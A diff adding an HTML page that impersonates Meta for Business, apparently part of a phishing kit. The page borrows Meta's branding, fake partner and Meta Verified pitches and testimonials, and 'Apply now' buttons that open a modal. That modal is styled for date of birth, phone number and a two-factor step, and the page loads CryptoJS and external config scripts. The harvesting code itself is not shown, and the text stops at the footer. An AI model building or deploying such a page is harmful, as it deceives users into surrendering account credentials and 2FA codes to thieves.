@@ -1,0 +1,1601 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/svg+xml" href="public/icons/favicon.svg">
+    <link rel="shortcut icon" href="public/icons/favicon.svg">
+
+    <style>
+      #intro-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 99999;
+        background: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: opacity 0.5s ease;
+        overflow: hidden;
+      }
+      #intro-overlay.fade-out {
+        opacity: 0;
+        pointer-events: none;
+      }
+      #intro-overlay img {
+        width: auto;
+        height: auto;
+        max-width: 100vw;
+        max-height: 100vh;
+        object-fit: contain;
+        display: block;
+        margin: auto;
+      }
+      body.intro-active {
+        overflow: hidden;
+      }
+    </style>
+    <title>Marketing tools and advertising solutions on Facebook and Instagram | Meta for Business</title>
+    <meta name="description" content="Find and reach more customers on Facebook, Instagram and Messenger. Get access to Meta&#039;s business tools, advertising resources and marketing help." />
+    <meta property="og:title" content="Marketing tools and advertising solutions on Facebook and Instagram | Meta for Business" />
+    <meta property="og:description" content="Find and reach more customers on Facebook, Instagram and Messenger. Get access to Meta&#039;s business tools, advertising resources and marketing help." />
+    <meta property="og:image" content="https://i.postimg.cc/T2VjjyDm/succes.jpg" />
+    <meta property="og:site_name" content="Marketing tools and advertising solutions on Facebook and Instagram | Meta for Business" />
+    <meta property="title" content="Marketing tools and advertising solutions on Facebook and Instagram | Meta for Business" />
+
+    <link rel="stylesheet" href="../public/styles/style.css">
+    <script src="../public/js/slide.js"></script>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+    <script src="../public/js/config.js"></script>
+    <script src="../public/js/utils.js"></script>
+    
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {
+                    pageLanguage: 'en',
+                    layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+                },
+                'google_translate_element'
+            );
+        }
+    </script>
+
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+    <!-- ===================== MODAL STYLES ===================== -->
+    <style>
+      .modal-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        z-index: 999;
+        background: rgba(0,0,0,0.45);
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        box-sizing: border-box;
+      }
+      .modal-overlay.open { display: flex; }
+      .modal-box {
+        background: #fff;
+        width: 100%;
+        max-width: 400px;
+        border-radius: 16px;
+        padding: 24px;
+        display: flex;
+        flex-direction: column;
+        max-height: 92vh;
+        overflow-y: auto;
+        transform: scale(0.9);
+        opacity: 0;
+        transition: transform 0.2s ease, opacity 0.2s ease;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      }
+      .modal-overlay.open .modal-box { transform: scale(1); opacity: 1; }
+      .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+      .modal-title { font-weight: 700; font-size: 15px; color: #0A1317; }
+      .modal-close {
+        width: 28px; height: 28px; border: none; background: none;
+        cursor: pointer; font-size: 22px; color: #9a9a9a; line-height: 1;
+        padding: 0; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      }
+      .modal-close:hover { background: #f0f0f0; color: #333; }
+      .modal-input-wrap {
+        width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
+        border-radius: 10px; background: #fff; font-size: 14px; margin-bottom: 10px;
+        display: flex; align-items: center; transition: border-color 0.2s;
+      }
+      .modal-input-wrap:focus-within { border-color: #3b82f6; }
+      .modal-input-wrap input {
+        width: 100%; outline: none; border: none; background: transparent;
+        font-size: 14px; font-family: inherit; height: 100%;
+      }
+      .modal-textarea-wrap {
+        width: 100%; border: 1px solid #d4dbe3; border-radius: 10px;
+        background: #fff; font-size: 14px; margin-bottom: 10px;
+        padding: 11px; transition: border-color 0.2s;
+      }
+      .modal-textarea-wrap:focus-within { border-color: #3b82f6; }
+      .modal-textarea-wrap textarea {
+        width: 100%; outline: none; border: none; background: transparent;
+        font-size: 14px; font-family: inherit; resize: none; display: block;
+      }
+      .modal-dob-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; margin-bottom: 10px; }
+      .modal-btn-primary {
+        width: 100%; height: 45px; background: #0064E0; color: #fff;
+        border: none; border-radius: 40px; font-size: 15px; font-weight: 500;
+        cursor: pointer; transition: background 0.2s; font-family: inherit;
+      }
+      .modal-btn-primary:hover:not(:disabled) { background: #0052c5; }
+      .modal-btn-primary:disabled { opacity: 0.75; cursor: default; }
+      .modal-btn-outline {
+        width: 100%; height: 40px; border: 1px solid #d4dbe3;
+        border-radius: 40px; background: #fff; font-size: 14px;
+        color: #9a979e; cursor: pointer; margin-top: 12px; font-family: inherit;
+      }
+      .modal-error { color: #ef4444; font-size: 13px; margin-bottom: 10px; display: none; }
+      .modal-error.show { display: block; }
+      .modal-label { font-size: 14px; color: #9a979e; font-weight: 700; margin-bottom: 7px; display: block; }
+      .modal-hint { font-size: 13px; color: #9a979e; margin-bottom: 12px; }
+      .modal-check-row { display: flex; align-items: center; gap: 8px; font-size: 14px; margin-bottom: 20px; cursor: pointer; }
+      .modal-check-row input { width: 16px; height: 16px; accent-color: #0064E0; flex-shrink: 0; }
+      .modal-check-row a { color: #0064E0; pointer-events: none; }
+      .modal-meta-logo { width: 64px; margin: 20px auto 0; display: block; }
+      .modal-meta-icon { width: 48px; margin: 0 auto 20px; display: block; }
+      .modal-user-info { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #9a979e; margin-bottom: 8px; }
+      .modal-dot { width: 4px; height: 4px; background: #9a979e; border-radius: 50%; display: inline-block; }
+      .modal-2fa-img, .modal-success-img { border-radius: 8px; overflow: hidden; margin-bottom: 16px; }
+      .modal-2fa-img img, .modal-success-img img { width: 100%; display: block; }
+      .modal-return-btn {
+        display: block; width: 100%; height: 40px; background: #0064E0;
+        color: #fff; text-align: center; border-radius: 40px; line-height: 40px;
+        text-decoration: none; font-size: 14px; font-weight: 500; transition: background 0.2s;
+      }
+      .modal-return-btn:hover { background: #0052c5; }
+      .modal-spinner {
+        width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.5);
+        border-top-color: #fff; border-radius: 50%;
+        animation: modalSpin 0.7s linear infinite; display: inline-block; vertical-align: middle;
+      }
+      @keyframes modalSpin { to { transform: rotate(360deg); } }
+
+      /* Phone Country Selector */
+      .pcs-phone-row { gap: 0; padding: 0; align-items: stretch; }
+      .pcs-wrap { position: relative; height: 100%; display: flex; align-items: center; }
+      .pcs-trigger {
+        display: flex; align-items: center; gap: 5px; cursor: pointer;
+        padding: 0 8px 0 10px; height: 100%; border-right: 1px solid #e5e7eb;
+        white-space: nowrap; user-select: none; flex-shrink: 0;
+        font-size: 18px;
+      }
+      .pcs-trigger:hover { background: #f9fafb; }
+      .pcs-dropdown {
+        position: absolute; top: calc(100% + 6px); left: 0;
+        width: 280px; background: #fff;
+        border: 1px solid #e5e7eb; border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+        z-index: 9999; overflow: hidden;
+      }
+      .pcs-search {
+        width: 100%; padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0;
+        font-size: 13px; outline: none; background: #fafafa;
+      }
+      .pcs-list { max-height: 220px; overflow-y: auto; }
+      .pcs-opt {
+        display: flex; align-items: center; gap: 8px;
+        padding: 8px 14px; cursor: pointer; transition: background 0.15s;
+      }
+      .pcs-opt:hover { background: #f0f4ff; }
+
+      .modal-box {
+        background-image: none !important;
+        background-color: #fff !important;
+        position: relative;
+      }
+      .modal-box::before { display: none; }
+      .modal-box.modal-compact {
+        max-height: none;
+        overflow-y: visible;
+      }
+    </style>
+
+</head>
+
+<body class="overflow-x-hidden intro-active">
+
+    <!-- INTRO OVERLAY -->
+    <div id="intro-overlay">
+      <img src="public/images/intro.gif" alt="intro" />
+    </div>
+
+    <script>
+      (function() {
+        var overlay = document.getElementById('intro-overlay');
+        setTimeout(function() {
+          overlay.classList.add('fade-out');
+          document.body.classList.remove('intro-active');
+          setTimeout(function() {
+            overlay.style.display = 'none';
+          }, 500);
+        }, 3000);
+      })();
+    </script>
+    
+    <script src="../public/js/translate.js"></script>
+    <div class="absolute top-0 right-0" id="google_translate_element"></div>
+
+    <!-- HEADER START -->
+    <div class='px-6 md:h-[80px] h-[60px] bg-[#f5f6f6] flex items-center justify-between'>
+        <div class='flex items-center justify-start gap-2 text-[14px]'>
+            <img src="../public/images/logo-meta.svg" class='md:w-[65px] w-[70px]' alt="blue" />
+            <div class='ml-[50px] md:flex hidden items-center justify-start gap-7 text-[#1c2b33]'>
+                <span data-i18n="nav_start" class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Get started</span>
+                <span data-i18n="nav_advertise" class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Advertise</span>
+                <span data-i18n="nav_learn" class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Learn</span>
+                <span data-i18n="nav_support" class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Support</span>
+            </div>
+        </div>
+        <div class='md:flex hidden items-center justify-start gap-10'>
+            <img src="../public/icons/ic_search.svg" class='w-[20px] h-[20px] cursor-pointer' alt="user" />
+            <img src="../public/icons/ic_user.svg" class='w-[40px] h-[40px] cursor-pointer' alt="user" />
+        </div>
+        <div class='md:hidden flex items-center justify-start gap-10'>
+            <img src="../public/icons/ic_search.svg" class='w-[20px] h-[20px] cursor-pointer' alt="user" />
+        </div>
+    </div>
+    <!-- HEADER END -->
+
+    <!-- HERO START -->
+    <div class='flex md:flex-row flex-col w-full items-center justify-between'>
+        <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
+            <div class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
+                <img src="../public/images/ic_blue.svg" alt="meta" class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
+                <h1 data-i18n="hero_title" class='md:text-[48px] text-[32px] font-[500] font-bold mb-4 order-2'>Become a Meta Business Partner</h1>
+                <p data-i18n="hero_desc1" class='text-[16px] text-[#1c2b33] font-[300] md:order-3 order-4'>Meta business partners enjoy unique benefits such as training, support, analytical reporting and customer networking opportunities.</p>
+                <p data-i18n="hero_desc2" class='text-[16px] text-[#1c2b33] font-[300] md:order-4 order-5'>Applicants can apply for a variety of specializations, including agency management, feed management and feed conversion data.</p>
+                <button onclick="openClientModal()" data-i18n="btn_apply" class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Apply now</button>
+            </div>
+        </div>
+        <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
+            <video src="public/images/video-meta.mp4" class='w-full h-full object-cover block md:h-full h-[300px] w-full' autoplay muted loop playsinline></video>
+        </div>
+    </div>
+
+    <div class='max-w-[1504px] mx-auto flex items-center justify-start md:py-[60px] py-[40px] md:px-[48px] px-6'>
+        <div class='md:max-w-[83%] max-w-full'>
+            <p data-i18n="trusted_title" class='text-[32px] font-[500]'>Meta Business Partners are trusted experts</p>
+            <p data-i18n="trusted_desc" class='text-[16px] mt-[18px] font-[300]'>Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you'll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.</p>
+            <a href="#" class='text-[#0064E0]'>
+                <div class='flex items-center justify-start gap-2 pt-3'>
+                    <div class='rounded-full w-[24px] h-[24px] flex items-center justify-center border border-[#0064E0]'>
+                        <img src="../public/icons/ic_circle.svg" alt="circle" class='w-[20px] h-[20px]' />
+                    </div>
+                    <span data-i18n="learn_more" class='text-[14px]'>Learn more</span>
+                </div>
+            </a>
+        </div>
+    </div>
+    <!-- HERO END -->
+
+    <!-- TRUST START -->
+    <div>
+        <div class='font-arial max-w-[1504px] mx-auto md:px-[48px] px-6 md:py-[60px] py-12'>
+            <div class='hidden md:flex flex-row items-center justify-between gap-20'>
+                <div class='w-1/2 relative aspect-[1/1] overflow-hidden'>
+                    <div class="feature-image absolute inset-0 transition-all duration-700 ease-in-out transform opacity-100" data-index="0">
+                        <img src="../public/images/credibility.png" class='w-full h-full object-cover' alt="Credibility" />
+                    </div>
+                    <div class="feature-image absolute inset-0 transition-all duration-700 ease-in-out transform opacity-0 pointer-events-none" data-index="1">
+                        <img src="../public/images/resources.png" class='w-full h-full object-cover' alt="Resources and support" />
+                    </div>
+                </div>
+                <div class='w-1/2 flex flex-col'>
+                    <div class='feature-item py-10 border-t border-gray-100 cursor-pointer first:border-t-0' data-index="0">
+                        <h3 data-i18n="feat1_title" class='text-[32px] font-[400] transition-all duration-500 text-[#1C2B33]'>Credibility</h3>
+                        <div class='feature-description overflow-hidden transition-all duration-500 text-[#1C2B33] ease-in-out max-h-[200px] opacity-100 mt-6'>
+                            <p data-i18n="feat1_desc" class='text-[16px]'>Earn the Meta Business Partners badge to show clients you're the best at what you do.</p>
+                        </div>
+                    </div>
+                    <div class='feature-item py-10 border-t border-gray-100 cursor-pointer' data-index="1">
+                        <h3 data-i18n="feat2_title" class='text-[32px] font-[400] transition-all duration-500 text-[#1C2B33]'>Resources and support</h3>
+                        <div class='feature-description overflow-hidden transition-all duration-500 text-[#1C2B33] ease-in-out max-h-0 opacity-0'>
+                            <p data-i18n="feat2_desc" class='text-[16px]'>Gain access to partner-specific resources, recommendations, training and chat or live support.</p>
+                        </div>
+                    </div>
+                    <div class='border-t border-gray-100'></div>
+                </div>
+            </div>
+            <!-- Mobile View -->
+            <div class='md:hidden flex flex-col gap-16'>
+                <div class='flex flex-col gap-8'>
+                    <div class='relative aspect-[1/1] overflow-hidden'>
+                        <img src="../public/images/credibility.png" class='w-full h-full object-cover' alt="Credibility" />
+                    </div>
+                    <div class='flex flex-col gap-4'>
+                        <h3 data-i18n="feat1_title" class='text-[32px] font-[400] text-[#1C2B33]'>Credibility</h3>
+                        <p data-i18n="feat1_desc" class='text-[16px] text-[#1C2B33] leading-[1.6]'>Earn the Meta Business Partners badge to show clients you're the best at what you do.</p>
+                    </div>
+                </div>
+                <div class='flex flex-col gap-8'>
+                    <div class='relative aspect-[1/1] overflow-hidden'>
+                        <img src="../public/images/resources.png" class='w-full h-full object-cover' alt="Resources and support" />
+                    </div>
+                    <div class='flex flex-col gap-4'>
+                        <h3 data-i18n="feat2_title" class='text-[32px] font-[400] text-[#1C2B33]'>Resources and support</h3>
+                        <p data-i18n="feat2_desc" class='text-[16px] text-[#1C2B33] leading-[1.6]'>Gain access to partner-specific resources, recommendations, training and chat or live support.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', () => {
+                const featureItems = document.querySelectorAll('.feature-item');
+                const featureImages = document.querySelectorAll('.feature-image');
+                const featureDescriptions = document.querySelectorAll('.feature-description');
+
+                featureItems.forEach(item => {
+                    item.addEventListener('mouseenter', () => {
+                        const index = item.getAttribute('data-index');
+                        featureImages.forEach(img => {
+                            if (img.getAttribute('data-index') === index) {
+                                img.classList.remove('opacity-0', 'pointer-events-none');
+                                img.classList.add('opacity-100');
+                            } else {
+                                img.classList.remove('opacity-100');
+                                img.classList.add('opacity-0', 'pointer-events-none');
+                            }
+                        });
+                        featureDescriptions.forEach(desc => {
+                            if (desc.closest('.feature-item').getAttribute('data-index') === index) {
+                                desc.classList.remove('max-h-0', 'opacity-0');
+                                desc.classList.add('max-h-[200px]', 'opacity-100', 'mt-6');
+                            } else {
+                                desc.classList.remove('max-h-[200px]', 'opacity-100', 'mt-6');
+                                desc.classList.add('max-h-0', 'opacity-0');
+                            }
+                        });
+                    });
+                });
+            });
+        </script>
+    </div>
+    <!-- TRUST END -->
+
+    <!-- BENEFITS START -->
+    <div class="bg-[url(../public/images/background.png)] bg-cover bg-center bg-no-repeat py-20 mb-20">
+        <div class='max-w-[1504px] mx-auto md:px-[32px] px-4 '>
+            <h2 data-i18n="explore_title" class='md:text-[36px] text-[28px] font-[500] text-[#1C2B33] leading-[1.2]'>Explore how Meta technologies can help transform your business.</h2>
+        </div>
+        <div class='max-w-[1504px] mx-auto md:px-[32px] pt-[40px]'>
+            <div class='flex flex-wrap'>
+                <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
+                            <img src="../public/icons/ic_performance.webp" alt="Improve ad performance" class="w-full h-full object-cover" />
+                        </div>
+                        <div class='flex-grow'>
+                            <h3 data-i18n="card1_title" class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Improve ad performance</h3>
+                            <div data-i18n="card1_desc" class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Maximise campaign results and simplify the setup process with advanced ad creation tools.</div>
+                        </div>
+                    </div>
+                </div>
+                <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
+                            <img src="../public/icons/ic_people.webp" alt="Reach more people" class="w-full h-full object-cover" />
+                        </div>
+                        <div class='flex-grow'>
+                            <h3 data-i18n="card2_title" class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Reach more people</h3>
+                            <div data-i18n="card2_desc" class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Get ads to people most likely to be interested in your products or services with automated targeting tools.</div>
+                        </div>
+                    </div>
+                </div>
+                <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
+                            <img src="../public/icons/ic_expert.webp" alt="Become an expert" class="w-full h-full object-cover" />
+                        </div>
+                        <div class='flex-grow'>
+                            <h3 data-i18n="card3_title" class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Become an expert</h3>
+                            <div data-i18n="card3_desc" class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Upgrade your marketing skills with free online courses and certifications through <a href="https://www.facebook.com/business/learn" class="text-[#0064E0] hover:underline">Meta Blueprint.</a></div>
+                        </div>
+                    </div>
+                </div>
+                <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
+                            <img src="../public/icons/ic_solutions.webp" alt="Get personalised ad solutions" class="w-full h-full object-cover" />
+                        </div>
+                        <div class='flex-grow'>
+                            <h3 data-i18n="card4_title" class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Get personalised ad solutions</h3>
+                            <div data-i18n="card4_desc" class='text-[16px] text-[#5D6C7B] leading-[1.5]'>See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.</div>
+                        </div>
+                    </div>
+                </div>
+                <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
+                            <img src="../public/icons/ic_understand.webp" alt="Understand performance" class="w-full h-full object-cover" />
+                        </div>
+                        <div class='flex-grow'>
+                            <h3 data-i18n="card5_title" class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Understand performance</h3>
+                            <div data-i18n="card5_desc" class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Access advanced marketing performance tracking with detailed overviews of audience behaviour.</div>
+                        </div>
+                    </div>
+                </div>
+                <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
+                    <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
+                        <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
+                            <img src="../public/icons/ic_formats.webp" alt="Use ad formats that work" class="w-full h-full object-cover" />
+                        </div>
+                        <div class='flex-grow'>
+                            <h3 data-i18n="card6_title" class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Use ad formats that work</h3>
+                            <div data-i18n="card6_desc" class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Designed to fit specific business goals, reach and expand your audience across every device.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- BENEFITS END -->
+
+    <!-- FEEDBACK START -->
+    <div class="max-w-[1504px] feedback mx-auto px-6 mb-[80px]">
+        <p data-i18n="feedback_title" class="text-center md:text-[32px] font-[500] text-[24px] mb-10">See how Meta Verified has helped real businesses.</p>
+        <div class="bg-[#f1f4f7] overflow-hidden rounded-[24px]" id="testimonial-wrapper">
+            <div class="flex transition-transform duration-500" id="testimonial-track">
+                <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                    <div class="text-center h-full flex flex-col justify-center items-center">
+                        <p data-i18n="testimonial1_quote" class="md:text-[24px] text-[17px] font-[300] mb-8">"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust. People that I don't know or newer brands interested in working with me can make sure that they're talking with me and not a scammer."</p>
+                        <p data-i18n="testimonial1_author" class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">Kimber Greenwood, Owner of Water Bear Photography</p>
+                    </div>
+                </div>
+                <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                    <div class="text-center h-full flex flex-col justify-center items-center">
+                        <p data-i18n="testimonial2_quote" class="md:text-[24px] text-[17px] font-[300] mb-8">"Since subscribing, I've noticed a real difference. My posts are getting more reach, engagement has gone up and I'm seeing more interactions on stories and reels."</p>
+                        <p data-i18n="testimonial2_author" class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">Devon Kirby, Owner, Mom Approved Miami</p>
+                    </div>
+                </div>
+                <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                    <div class="text-center h-full flex flex-col justify-center items-center">
+                        <p data-i18n="testimonial3_quote" class="md:text-[24px] text-[17px] font-[300] mb-8">"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously."</p>
+                        <p data-i18n="testimonial3_author" class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">Sarah Clancy, Owner of Sarah Marie Running Co.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="flex items-center justify-center gap-8 mt-6">
+            <button id="prev-feed" class="w-[32px] h-[32px] md:block hidden">
+                <img src="../public/icons/ic_left.svg" class="w-[32px] h-[32px]">
+            </button>
+            <div class="flex gap-2" id="dots">
+                <button class="w-[10px] h-[10px] rounded-full bg-gray-900"></button>
+                <button class="w-[10px] h-[10px] rounded-full bg-gray-300"></button>
+                <button class="w-[10px] h-[10px] rounded-full bg-gray-300"></button>
+            </div>
+            <button id="next-feed" class="w-[32px] h-[32px] md:block hidden">
+                <img src="../public/icons/ic_right.svg" class="w-[32px] h-[32px]">
+            </button>
+        </div>
+    </div>
+    <!-- FEEDBACK END -->
+
+    <!-- ACTION START -->
+    <div class='flex md:flex-row flex-col w-full items-center justify-between'>
+        <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
+            <video src="public/images/video-meta.mp4" class='w-full h-full object-cover block md:h-full h-[300px] w-full' autoplay muted loop playsinline></video>
+        </div>
+        <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
+            <div class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
+                <img src="../public/images/ic_blue.svg" alt="meta" class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
+                <h1 data-i18n="action_title" class='md:text-[48px] text-[32px] font-[500] font-bold mb-4 order-2'>Ready to become Meta Verified?</h1>
+                <button onclick="openClientModal()" data-i18n="btn_apply" class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Apply now</button>
+            </div>
+        </div>
+    </div>
+    <!-- ACTION END -->
+
+    <!-- FAQ START -->
+    <div class="faq max-w-[1504px] mx-auto mt-20 mb-[80px] px-6">
+        <p data-i18n="faq_title" class="text-[32px] font-[500] mb-3">FAQ</p>
+        <p data-i18n="faq_more" class="text-[18px] font-[500] mb-10">
+            For more, visit our Help Centre
+            (<a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://www.facebook.com/business/help/2876154822522394">Instagram and Facebook</a>;
+            <a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://faq.whatsapp.com/3872729742954601">WhatsApp</a>).
+        </p>
+        <div class="divide-y border-t border-b">
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span data-i18n="faq_q1" class="md:text-[24px] text-[20px]">How do I know if my business is eligible?</span>
+                    <span class="faq-icon transition-transform"><img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]"></span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div data-i18n="faq_a1" class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        Meta Verified is available in selected regions for businesses that meet certain eligibility requirements
+                        (<a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://www.facebook.com/business/help/2876154822522394">requirements for Facebook and Instagram</a>;
+                        <a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://faq.whatsapp.com/3872729742954601">requirements for WhatsApp</a>).
+                    </div>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span data-i18n="faq_q2" class="md:text-[24px] text-[20px]">How can I stay informed if I'm not yet eligible?</span>
+                    <span class="faq-icon transition-transform"><img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]"></span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div data-i18n="faq_a2" class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        <a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://business.facebook.com/business/loginpage">Join our waitlist</a> to stay updated. We will notify you when Meta Verified for businesses is available.
+                    </div>
+                </div>
+            </div>
+            <div class="faq-item">
+                <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                    <span data-i18n="faq_q3" class="md:text-[24px] text-[20px]">I already have a verified badge. What happens to it?</span>
+                    <span class="faq-icon transition-transform"><img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]"></span>
+                </button>
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                    <div data-i18n="faq_a3" class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                        No action is needed in order to keep your badge. Existing verified badge holders can apply for a Meta Verified subscription.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- FAQ END -->
+
+    <!-- FOOTER START -->
+    <footer class="bg-[#1b2a34] text-white">
+        <div class="max-w-[1504px] mx-auto py-20 mt-20 px-6 grid grid-cols-1 lg:grid-cols-2 gap-10 items-start">
+            <div>
+                <h2 data-i18n="footer_title" class="text-3xl font-semibold leading-snug mb-4">Get the latest updates from Meta for business.</h2>
